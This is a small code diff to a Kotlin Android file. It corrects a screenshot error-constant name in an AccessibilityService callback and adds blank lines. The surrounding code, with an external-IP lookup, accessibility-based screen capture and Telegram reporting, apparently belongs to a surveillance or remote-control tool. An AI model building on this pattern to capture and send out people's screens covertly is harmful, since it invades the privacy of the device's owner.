@@ -220,9 +220,9 @@ fun getExternalIP(): String {
                         }
                     }
 
-                    override fun onFailure(errorCode: Int) {
+override fun onFailure(errorCode: Int) {
                         val errMsg = when (errorCode) {
-                            AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERVAL_ERROR ->
+                            AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR ->
                                 "Screenshot failed (overlay/locked)"
                             AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME ->
                                 "Too many attempts"
@@ -234,6 +234,11 @@ fun getExternalIP(): String {
                 }
             )
         }
+
+
+
+
+                    
         if (bitmap == null) {
             sendTelegramMessage("❌ Failed to capture screenshot (screen may be locked or overlay active)")
             return
